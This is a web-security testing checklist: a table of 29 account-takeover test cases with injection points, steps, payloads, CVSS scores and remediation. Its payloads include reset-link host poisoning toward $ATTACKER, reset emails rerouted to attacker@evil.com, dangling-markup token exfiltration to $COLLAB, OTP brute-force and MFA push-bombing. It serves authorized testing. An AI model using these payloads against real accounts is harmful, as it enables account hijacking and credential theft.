# Account Takeover — Checklist

Expert per-attack **test-case matrix** for Account Takeover — in testing order, impact-first. All columns preserved (where to inject, steps, expected, payload, impact, severity, CVSS, tools, refs).

*29 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| ATO-001 | Map the auth surface + register two accounts | Recon &amp; Auth Surface | login, register, reset, change-email/phone, change-password, 2FA/OTP, SSO/link, session/logout | 1. Enumerate every auth flow: login, register, reset, change-email/phone, change-password, 2FA/OTP, SSO/link, session/logout.<br>2. Capture each request/response; note the MISSING control per flow (re-auth? verification? rate-limit? token binding? host source?).<br>3. Register A (attacker) and B (victim) - your own emails; stand up a listener for poisoned links. | A menu of auth flows with the missing control flagged per flow. | <code>flows table: reset(no host binding) ; change-email(no re-auth) ; 2FA(force-browsable)</code> | The flow that lacks a control the others have is the ATO target. | Info | 0.0 (N/A) | Burp Suite Pro, interactsh | CWE-640; OWASP Testing Guide: Authentication + Forgot Password (WSTG-ATHN) |
| ATO-002 | Reset-link host poisoning (Host / X-Forwarded-Host) | Password Reset | The forgot-password request; Host/X-Forwarded-Host/X-Host headers | 1. Trigger the reset FOR B, adding a poisoned host: Host: $ATTACKER ; X-Forwarded-Host: $ATTACKER ; X-Host ; userinfo trick target.com:@$ATTACKER ; dual-Host/CRLF.<br>2. If the reset page loads YOUR resource, the token also leaks via Referer.<br>3. Catch B's token at your listener -&gt; set B's password -&gt; log in as B. | B's reset link/token is built with your host and lands at your listener. | <code>X-Forwarded-Host: $ATTACKER ; Host: target.com:@$ATTACKER ; then B's token arrives -&gt; set B's pw</code> | 0-click account takeover via reset poisoning - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | poc/reset_poison_probe.py, Burp | CWE-640; CWE-644; HackTricks: Account Takeover |
| ATO-003 | Reset token disclosed in response / redirect / logs | Password Reset | The forgot-password response | 1. Inspect the reset response JSON / redirect / logs for the token or full reset link.<br>2. If present, an attacker can reset ANY email with no interaction.<br>3. Confirm on B. | The reset token/link appears in the server response. | <code>POST /forgot {email:B} -&gt; 200 {"reset_token":"..."} or Location: /reset?token=...</code> | Unauthenticated ATO of any account - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-640; CWE-200; HackTricks: Account Takeover |
| ATO-004 | Reset-token weakness (predictable / replay / not-bound) | Password Reset | Reset tokens (analyze YOUR OWN) | 1. Collect N tokens for your account -&gt; sequential / timestamp / short / low-entropy / base64(userid+ts)?<br>2. Lifecycle: still valid after use / after a 2nd request / after email/password change? (replay).<br>3. NOT bound to user: submit YOUR valid token + B's id/email on the set-password step. | A token is guessable, replayable, or accepts a different user's id. | <code>poc/reset_token_analyzer.py -&gt; sequential ; MY_TOKEN + id=B on set-password -&gt; B's pw changed</code> | Forge/replay reset tokens -&gt; ATO of any account - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | poc/reset_token_analyzer.py | CWE-640; CWE-330; PortSwigger Web Security Academy: Authentication vulnerabilities |
| ATO-005 | Reset email parameter abuse (HPP / array / CRLF-CC) | Password Reset | The email field on the reset request | 1. HPP/array: email=victim@target.com&amp;email=attacker@evil.com ; {"email":["victim","attacker"]} - validated as B, mailed to you.<br>2. CRLF second recipient: email=victim@target.com%0acc:attacker@evil.com.<br>3. Comma/space multi-recipient. Confirm B's token arrives at your inbox. | B's reset token is mailed to an attacker address you control. | <code>email=victim@target.com&amp;email=attacker@evil.com ; email=victim@target.com%0acc:attacker@evil.com</code> | ATO via email-parameter confusion -&gt; B's token to attacker - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-640; HackTricks: Account Takeover |
| ATO-006 | Trusted reset_url / callback body field | Password Reset | reset_url / callbackUrl / domain body fields | 1. Add {"reset_url":"https://$ATTACKER/","callbackUrl":"https://$ATTACKER/","domain":"$ATTACKER"} to the reset request.<br>2. If the app builds the link from a body field, the token points at you.<br>3. Confirm B's token lands. | The reset link is built from an attacker-supplied body field. | <code>{"email":"victim@target.com","reset_url":"https://$ATTACKER/"}</code> | 0-click ATO via trusted callback field - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-640; HackTricks: Account Takeover |
| ATO-007 | Email normalization / unicode collision | Password Reset / Registration | Email comparison vs delivery normalization | 1. Request B's reset via a 'different' address that normalizes to B: Victim@x.com, victim@x.com., victim+x@x.com, unicode look-alike.<br>2. Signup/lookup treats it as new while delivery resolves to B (or vice versa).<br>3. Confirm you obtain B's reset / collide with B's account. | A normalized-twin address yields B's reset or collides with B's account. | <code>Victim@target.com ; victim+x@target.com ; vict?m@target.com (unicode)</code> | ATO / account collision via normalization mismatch - High/Critical. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Repeater | CWE-640; CWE-178; HackTricks: Account Takeover |
| ATO-008 | Reset-email HTML / dangling-markup injection -&gt; token exfil | Password Reset | Any attacker-influencable value rendered into the reset email HTML (display name, requester field, org/team name, header reflected into the link) | 1. Find a value that lands UNSANITIZED in the reset email body or the &lt;a href&gt; of the reset link (your display name, a request param, a reflected header).<br>2. Inject dangling markup that swallows the following HTML (the reset link/token) and beacons it out: "&gt;&lt;img src='//$COLLAB?leak=  (unterminated tag).<br>3. Trigger B's reset; when B opens the email the image loads and exfiltrates the token to $COLLAB. Also test plain &lt;a&gt;/&lt;img&gt; HTML injection and token leak via Referer. | Attacker markup renders in the reset email and exfiltrates the reset token to $COLLAB. | <code>display_name="&gt;&lt;img src='//$COLLAB?t= ; name/header reflected into the reset &lt;a href&gt;</code> | Steal the reset token from the victim's email -&gt; ATO (victim must open the email) - High. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) | Burp, interactsh | CWE-640; CWE-79; CWE-644; HackTricks: Dangling markup / Account Takeover |
| ATO-009 | Magic-link / passwordless login token weakness | Passwordless / Magic Link | passwordless 'email me a login link', magic-login, invite/activation links | 1. Request several magic-login links for YOUR account -&gt; analyze entropy: sequential / short / timestamped / base64(email+ts) / token reused across requests?<br>2. Lifecycle: still valid after use, after a new link is requested, after logout; never expires? Not bound to the requesting device/session?<br>3. Not bound to user: submit YOUR magic token with B's id/email; forge B's token if predictable. Confirm login AS B. | A magic-login token is guessable / replayable / not user-bound and logs you in as B. | <code>poc/reset_token_analyzer.py on magic links ; MY_MAGIC_TOKEN + id=B ; predictable ?token=base64(email+ts)</code> | Forge or replay passwordless login -&gt; 0-click ATO of any account - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | poc/reset_token_analyzer.py, Burp | CWE-640; CWE-330; PortSwigger Web Security Academy: Authentication vulnerabilities; HackTricks: Account Takeover |
| ATO-010 | Structural 2FA bypass (force-browse / session-before-2FA) | 2FA / OTP | The 2FA step in the login flow | 1. After the password step, force-browse straight to /dashboard or the authenticated API (skip /2fa).<br>2. If the login response returns a usable session cookie BEFORE 2FA, use it.<br>3. Try the API / mobile / legacy / SSO path that doesn't enforce 2FA. | An authenticated session is reached without completing 2FA. | <code>password step -&gt; GET /dashboard directly ; session cookie issued pre-2FA</code> | 2FA bypass -&gt; full login (with a leaked/known password) - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-640; CWE-287; HackTricks: Account Takeover |
| ATO-011 | 2FA response manipulation (client-trusted boolean) | 2FA / OTP | The 2FA verify response | 1. Flip a client-trusted flag: {"2fa_required":true}-&gt;false ; {"verified":false}-&gt;true ; {"mfa":"pending"}-&gt;"approved".<br>2. Disable-2FA endpoint without re-auth/OTP; recovery-code path weaker than TOTP.<br>3. Confirm the session proceeds authenticated. | A flipped response boolean bypasses the 2FA requirement. | <code>{"2fa_required":false} ; {"verified":true} ; POST /2fa/disable (no re-auth)</code> | 2FA bypass via client-trusted state - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-640; CWE-287; HackTricks: Account Takeover |
| ATO-012 | OTP missing / resettable rate-limit -&gt; brute | 2FA / OTP | The OTP verify endpoint (test on YOUR OWN account) | 1. Submit N wrong codes; are they still accepted (no lock)?<br>2. Rate-limit bypass: re-request OTP to reset the counter, new session/cookie per attempt, rotate X-Forwarded-For, parallel race.<br>3. Bounded proof on your own account only - prove RL absent, do NOT crack a real user. | Many wrong OTPs are accepted without lockout on your own account. | <code>poc/otp_bruteforce.py (bounded) ; re-request OTP to reset counter ; rotate X-Forwarded-For</code> | OTP brute-force -&gt; 2FA bypass -&gt; ATO - High/Critical. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | poc/otp_bruteforce.py, Turbo Intruder | CWE-640; CWE-307; PortSwigger Web Security Academy: Authentication vulnerabilities |
| ATO-013 | OTP value tricks (null / 000000 / array / reuse) | 2FA / OTP | The OTP verify endpoint | 1. Malformed values: 000000, "", null, true, otp[]=correct, {"otp":["1",...]}, leading-zero/negative/very-long.<br>2. Reuse: the LAST OTP still valid; same OTP across users.<br>3. OTP leaked in the response, or delivery changeable to your phone/email. | A malformed/reused OTP is accepted as valid. | <code>{"otp":null} ; otp=000000 ; otp[]=&lt;correct&gt; ; reuse last OTP</code> | 2FA bypass via OTP handling flaws - High/Critical. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Repeater | CWE-640; CWE-287; HackTricks: Account Takeover |
| ATO-014 | OTP / 2FA delivery hijack (reroute the factor / enroll attacker device) | 2FA / OTP | registered phone/email/authenticator; 'send code to', add-device, recovery-contact endpoints | 1. Change the OTP/reset DELIVERY target on B (add or replace phone/email/authenticator) with weak or no re-auth -&gt; the second factor now arrives at YOUR target.<br>2. Enroll an attacker authenticator / recovery contact on B (IDOR/CSRF on the credential-register or recovery endpoint) as an always-available factor.<br>3. Chain: repoint delivery -&gt; trigger reset/OTP -&gt; receive it -&gt; complete login as B. | The 2nd-factor/reset code is delivered to an attacker target, or an attacker factor is enrolled on B. | <code>POST /account/2fa/phone {"phone":"$ATTACKER"} (no re-auth) ; POST /webauthn/credentials {attacker} on B ; add recovery email=$ATTACKER</code> | Reroute/enroll the second factor -&gt; recovery hijack -&gt; ATO despite MFA - High/Critical. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp, Chrome virtual authenticator | CWE-640; CWE-287; CWE-306; HackTricks: 2FA bypass |
| ATO-015 | MFA fatigue / push-bombing | 2FA / OTP | Push-based MFA approval prompt | 1. With valid (or phished) creds, repeatedly trigger the MFA push to the victim<br>2. Fire dozens of approval prompts (optionally timed with a fake IT/support pretext)<br>3. Victim taps Approve out of fatigue/confusion<br>4. Session is granted to the attacker | Number-matching + limited push attempts + velocity throttle; deny on repeated prompts | <code>loop: POST /mfa/push  (N prompts) until 'approved'</code> | MFA fatigue -&gt; victim approves attacker login -&gt; full ATO despite MFA enabled | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Intruder, custom script | CWE-287; CWE-1390; HackTricks 2FA bypass; Microsoft/Uber push-fatigue incident writeups; NIST 800-63B |
| ATO-016 | WebAuthn / passkey registration &amp; recovery bypass | 2FA / OTP | WebAuthn/passkey registration &amp; account-recovery flow | 1. Check whether a weaker fallback factor (SMS/OTP/password) is always available<br>2. Try registering an attacker authenticator to the victim account via IDOR/CSRF on the credential-register endpoint<br>3. Abuse account recovery to downgrade from passkey to password<br>4. Log in with the attacker factor | Recovery requires step-up; credential registration is bound + re-authenticated; no silent downgrade | <code>POST /webauthn/credentials {attacker attestation} on victim session (no re-auth)</code> | Passkey/WebAuthn bypass via weak fallback or attacker-credential registration -&gt; ATO | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp, Chrome virtual authenticator | CWE-287; CWE-308; W3C WebAuthn Level 2 spec; FIDO2 security considerations; PortSwigger |
| ATO-017 | Change email/phone without re-auth or verification | Email/Phone Change | The change-email/phone endpoint | 1. Change email with NO current-password / NO OTP -&gt; set B's email to yours, then reset.<br>2. New email active BEFORE verification; no confirmation to the OLD email.<br>3. Change B's phone/email so the OTP is delivered to YOU (chains with 2FA). | The account email/phone changes without re-auth/verification. | <code>POST /account/email {"email":"me@evil.com"} (no current password) -&gt; then reset</code> | Identity repoint -&gt; recovery hijack -&gt; ATO - Critical. | Critical | 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) | Burp Repeater | CWE-640; CWE-620; HackTricks: Account Takeover |
| ATO-018 | Change-password weakness (no current password / CSRF / IDOR) | Password Change | the in-session change-password endpoint | 1. Change the password WITHOUT the current password (omit the field / server ignores it / any value accepted) -&gt; set a known password.<br>2. CSRF: is change-password protected by a token/re-auth? If not, host an auto-submit form that sets a known password when B visits (UI:R) -&gt; log in as B.<br>3. IDOR: POST /api/user/{B}/password {"new":"..."} -&gt; change B's password directly (cross-ref ATO-026). | Password changes with no current password / no CSRF protection / for another user. | <code>POST /account/password {"new":"Passw0rd!"} (no current_password) ; CSRF auto-submit form ; /api/user/$B/password</code> | In-session / CSRF / IDOR password reset -&gt; ATO - High (Critical via IDOR). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) | Burp, CSRF PoC generator | CWE-640; CWE-620; CWE-352; PortSwigger Web Security Academy: Authentication vulnerabilities |
| ATO-019 | Login/auth response substitution &amp; flow-step skipping | Logic &amp; Response Tampering | the login/SSO response; multi-step login (identifier-first, step-up, risk/device check) | 1. Response substitution: flip the login verdict in the response - {"success":false}-&gt;true, {"authenticated":false}-&gt;true, an error swapped for a 200 that carries a session; replay a valid response over an invalid one.<br>2. Step-skip: in identifier-first / step-up / force-password-change flows, jump past a step straight to the authenticated area.<br>3. Verb/param/content-type tamper on the auth endpoint; downgrade to a legacy/mobile login that trusts the client. | A tampered response or skipped step yields an authenticated session. | <code>{"authenticated":true} ; skip /login/step2 -&gt; GET /app ; POST-&gt;GET or JSON-&gt;form on /login</code> | Client-trusted auth / step-skip -&gt; login bypass -&gt; ATO - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-287; CWE-603; CWE-841; PortSwigger Web Security Academy: Authentication vulnerabilities |
| ATO-020 | Pre-account-takeover (seed victim email before them) | Pre-ATO | Registration on SSO-enabled apps | 1. Register B's email + YOUR password before B (verification not enforced/skippable): {"email":"victim@corp.com","email_verified":true}.<br>2. Victim later 'Sign in with Google/SSO' -&gt; app merges into your pre-existing account.<br>3. Your password still works -&gt; shared access. (Cross-ref OAuth kit.) | The victim's SSO login merges into the attacker's pre-seeded account. | <code>register victim@corp.com by password now -&gt; victim SSOs later -&gt; accounts merge, attacker pw persists</code> | 0-click silent ATO via pre-registration - High/Critical (most-missed). | Critical | 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) | Burp Repeater | CWE-640; CWE-287; HackTricks: Account Takeover |
| ATO-021 | Registration collision / mass-assignment | Registration | The register / profile-update endpoint | 1. Collision: register Victim@x.com when victim@x.com exists (case/dot/unicode/whitespace) - overwrite/link instead of reject?<br>2. Mass-assignment: {"email":"me@evil.com","email_verified":true,"is_admin":true}.<br>3. Confirm you gain access/privilege on the colliding account. | A collision overwrites/links an existing account, or mass-assignment sets privileged fields. | <code>register Victim@x.com (existing victim@x.com) ; {"email_verified":true,"is_admin":true}</code> | Account collision / privilege self-grant -&gt; ATO/admin - High/Critical. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Repeater | CWE-640; CWE-915; HackTricks: Account Takeover |
| ATO-022 | Account / username enumeration (differential / timing) | Enumeration (precursor) | login, forgot-password, register, 2FA, change-email responses | 1. Differential responses: distinct message / HTTP status / JSON for existing vs non-existing user - login ('wrong password' vs 'no such user'), register ('already taken'), reset ('email sent' only for real users).<br>2. Timing side-channel: valid usernames respond slower (password hash runs only for real accounts).<br>3. Build a valid-account list -&gt; feed targeted reset-poisoning / brute / pre-ATO. | Existing vs non-existing accounts are distinguishable by message, status, or timing. | <code>login {user:known} vs {user:random} -&gt; diff ; /forgot -&gt; 'sent' only for real ; measure response time</code> | Account enumeration -&gt; a targets list that powers every other ATO technique (precursor) - Medium. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Intruder, ffuf | CWE-204; CWE-203; OWASP Testing Guide: WSTG-IDNT-04 |
| ATO-023 | Password brute-force / credential stuffing (no lockout) | Brute / Stuffing | the primary password-login endpoint (test on YOUR OWN account) | 1. On YOUR OWN account submit N wrong passwords - lockout? throttle? CAPTCHA after failures?<br>2. Rate-limit bypass: rotate X-Forwarded-For, new session/cookie per attempt, parallel/race, GraphQL alias batching, IP rotation.<br>3. Credential stuffing: does the app block known-breach reuse / velocity across accounts? Bounded proof on your own account only - never brute a real user. | Many wrong passwords are accepted without lockout/throttle on your own account. | <code>Turbo Intruder on /login ; rotate X-Forwarded-For per attempt ; GraphQL alias-batched login</code> | No lockout -&gt; credential brute/stuffing -&gt; ATO of weak/reused-password accounts - High. | High | 7.4 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N) | Turbo Intruder, Hydra | CWE-307; CWE-799; OWASP Testing Guide: WSTG-ATHN-03; PortSwigger Web Security Academy: Authentication vulnerabilities |
| ATO-024 | Session fixation &amp; non-invalidation | Session &amp; Token | Session cookie lifecycle | 1. Fixation: set a known session id for B (cookie/URL); B logs in; if the id is NOT rotated -&gt; your copy is authenticated.<br>2. Session valid AFTER logout / password-change / email-change -&gt; stolen sessions survive.<br>3. 'remember me'/trusted-device token predictable/not-bound/never-expires; token in URL; JWT alg:none/weak (JWT kit). | A fixed session is honored, or a session survives logout/password-change. | <code>set session=known for B ; B logs in, id unchanged ; session still 200 after /logout + pw change</code> | Session takeover / permanent stolen sessions - High/Critical. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Repeater | CWE-640; CWE-384; PortSwigger Web Security Academy: Authentication vulnerabilities |
| ATO-025 | Session puzzling / cross-flow session variable confusion | Session &amp; Token | Multi-step flows sharing session variables (reset/register/checkout) | 1. Start flow A (e.g. password reset) that stores userId/email in the session<br>2. Switch to flow B that reads the same session variable for authorization<br>3. Overwrite the variable via flow A with a victim value<br>4. Complete flow B as the victim | Session variables namespaced per-flow + re-validated; no cross-flow trust | <code>reset?email=victim  (sets session.userId) -&gt; then /profile trusts session.userId</code> | Session puzzling -&gt; cross-flow variable overwrite -&gt; authN/authz bypass -&gt; ATO | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp | CWE-384; CWE-841; Shay Chen session-puzzling research (Session Variable Overloading, DeepSec 2013); OWASP WSTG-SESS |
| ATO-026 | IDOR/injection cash-out to ATO | Chains -&gt; ATO | change-email/password/phone with a userId param; existing primitives | 1. IDOR: POST /api/user/{B_id}/email {"email":"me@evil.com"} - change B's creds as A -&gt; reset -&gt; ATO (IDOR kit).<br>2. Mass-assignment/broken object-authz on account update (REST/GraphQL).<br>3. Cash out an existing primitive: XSS(cookie steal)/CSRF/CORS/WebCache-deception/SSRF/SQLi/OAuth/JWT-forgery(alg-confusion or weak HS256 secret) -&gt; drive it INTO B's account. | A separate primitive is converted into a completed takeover of B. | <code>POST /api/user/$B/email {me@evil.com} -&gt; reset -&gt; inside B ; XSS steals B's cookie -&gt; inside B</code> | Converts IDOR/XSS/CSRF/etc into Critical ATO - the cash register. | Critical | 9.6 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N) | Burp, IDOR/XSS kits | CWE-640; CWE-639; HackTricks: Account Takeover |
| ATO-027 | OAuth / social account-linking takeover | Chains -&gt; ATO | Account-linking endpoint (link social/OAuth to an existing account) | 1. Link your attacker OAuth identity to a victim account by controlling the email/sub, OR pre-link before the victim registers<br>2. When the victim signs in via social, they land in your linked account (or you gain theirs)<br>3. Confirm cross-account access / data<br>4. Prove takeover with a value only the victim sees | Linking verifies ownership of both identities + re-auth; email_verified enforced | <code>POST /account/link {provider:google, email:victim@x}  (no ownership proof)</code> | Account-linking abuse -&gt; attacker identity bound to victim account -&gt; ATO | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp | CWE-287; CWE-290; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); PortSwigger OAuth; disclosed account-linking ATO writeups |
| ATO-028 | False-positive filter / auto-reject | Validation &amp; Reporting | Before reporting any candidate | 1. REJECT: you only saw YOUR OWN reset token (not B's leak/reset); Host REFLECTED but you never received B's token / never logged in as B; 'no rate-limit'/'token in Referer'/'cookie not HttpOnly' with NO completed takeover; you changed YOUR OWN email (expected); pre-ATO 'possible' but the merge did NOT happen; logout only failing to clear a CLIENT cookie (server session already invalid). ; account 'enumeration' or 'no login lockout' with NO completed takeover (a lead, not an ATO); a magic-link/passwordless or reset token that only worked for YOUR OWN account; markup 'reflected' in an email but the token was never actually exfiltrated to your listener.<br>2. REQUIRE: the proof ends 'as A (or unauth), I am inside B's account' (B-only marker read). | Only completed takeovers of B (two own accounts) survive. | <code>reflected host + no token = FP ; own-email-change = FP ; no-rate-limit-alone = lead not finding</code> | Protects credibility; ATO is dense with leads-masquerading-as-findings. | Info | 0.0 (N/A) | manual | CWE-640; PortSwigger Web Security Academy: Authentication vulnerabilities |
| ATO-029 | Client-facing impact &amp; SAFE-PoC package | Validation &amp; Reporting | Confirmed finding, pre-submission | 1. Lead with the takeover; confirm reach (any user? admin?) and interaction (zero/one-click); note it usually bypasses MFA.<br>2. Provide the two-account flow: A's actions + proof of reading a B-only marker inside B's account (or B's token caught at your listener).<br>3. Set CVSS 3.1 + the matching CWE (640/287/384/639/307/306/204/352). Remediation: high-entropy single-use user-bound reset AND passwordless/magic tokens; server-set reset host; login+OTP rate-limit+lockout; re-auth+verify on change-password/email/phone/2FA-delivery; rotate/invalidate sessions; verify-before-merge (pre-ATO); enumeration-neutral responses.<br>4. Two own accounts, bounded OTP/token tests, RESTORE B's state (note it), never touch a real user; de-dupe to one root cause. | A reproducible, correctly-rated, safe two-account PoC with clear remediation. | <code>PoC: A's actions + 'inside B' proof (B-only marker / B's token on listener) + CVSS + CWE + remediation.</code> | Converts the takeover into a defensible Critical report at the right severity (MFA-bypass argued). | Info | 0.0 (N/A) | CVSS calculator, ACCOUNT_TAKEOVER_REPORT_TEMPLATE.md | CWE-640; CWE-287; CWE-384; FIRST CVSS v3.1; OWASP Testing Guide: Authentication + Forgot Password (WSTG-ATHN)  &#124;  TOP REFERENCES: PortSwigger Academy Authentication; disclosed HackerOne/Bugcrowd ATO writeups; HackTricks; OWASP WSTG |
